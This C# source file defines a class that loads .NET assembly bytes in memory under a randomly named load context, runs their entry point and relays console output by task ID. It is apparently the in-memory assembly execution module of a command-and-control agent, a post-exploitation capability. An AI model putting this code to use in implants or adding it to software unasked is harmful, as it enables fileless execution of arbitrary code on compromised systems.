using System.Reflection;
using System.Runtime.Loader;
using Agent.Interfaces;
using Agent.Utilities;
using Agent.Models;

public class ConsoleApplicationExecutor
{
    private static readonly SemaphoreSlim ConsoleExecutionGate = new(1, 1);

    private readonly AssemblyLoadContext loadContext = new(Misc.RandomString(10), isCollectible: true);
    private readonly byte[] assemblyBytes;
    private readonly string[] arguments;
    private readonly string taskId;
    private readonly IMessageManager messageManager;
    private int running;

    public ConsoleApplicationExecutor(byte[] asmBytes, string[] args, string task_id, IMessageManager messageManager)
    {
        this.messageManager = messageManager;
        assemblyBytes = asmBytes;
        arguments = args;
        taskId = task_id;
    }

    public async Task ExecuteAsync()
    {
        if (Interlocked.CompareExchange(ref running, 1, 0) != 0)
            throw new InvalidOperationException("This assembly executor is already running.");

        bool gateHeld = false;
        try
        {
            await ConsoleExecutionGate.WaitAsync().ConfigureAwait(false);
            gateHeld = true;

            await Task.Run(ExecuteWithConsoleRedirectAsync).ConfigureAwait(false);
        }
        finally
        {
            if (gateHeld)
                ConsoleExecutionGate.Release();
            Volatile.Write(ref running, 0);
        }
    }

    private async Task ExecuteWithConsoleRedirectAsync()
    {
        using var redirector = new ConsoleWriter();
        redirector.WriteEvent += ConsoleWriterOnWrite;
        redirector.WriteLineEvent += ConsoleWriterOnWriteLine;
        try
        {
            Assembly assembly = loadContext.LoadFromStream(new MemoryStream(assemblyBytes));
            MethodInfo entryPoint = assembly.EntryPoint
                ?? throw new InvalidOperationException("Failed to find entrypoint.");
            object?[]? parameters = entryPoint.GetParameters().Length == 0
                ? null
                : new object?[] { arguments };
            object? result = entryPoint.Invoke(null, parameters);
            if (result is Task task)
                await task.ConfigureAwait(false);

            messageManager.WriteLine("Assembly execution complete.", taskId, true);
        }
        catch (Exception exception)
        {
            Exception actual = exception is TargetInvocationException { InnerException: not null }
                ? exception.InnerException
                : exception;
            messageManager.WriteLine(actual.ToString(), taskId, true, "error");
        }
        finally
        {
            redirector.WriteEvent -= ConsoleWriterOnWrite;
            redirector.WriteLineEvent -= ConsoleWriterOnWriteLine;
            loadContext.Unload();
        }
    }

    private void ConsoleWriterOnWriteLine(object? sender, ConsoleWriterEventArgs args) =>
        messageManager.WriteLine(args.Value, taskId, false);

    private void ConsoleWriterOnWrite(object? sender, ConsoleWriterEventArgs args) =>
        messageManager.Write(args.Value, taskId, false);

    public bool IsRunning() => Volatile.Read(ref running) != 0;
}
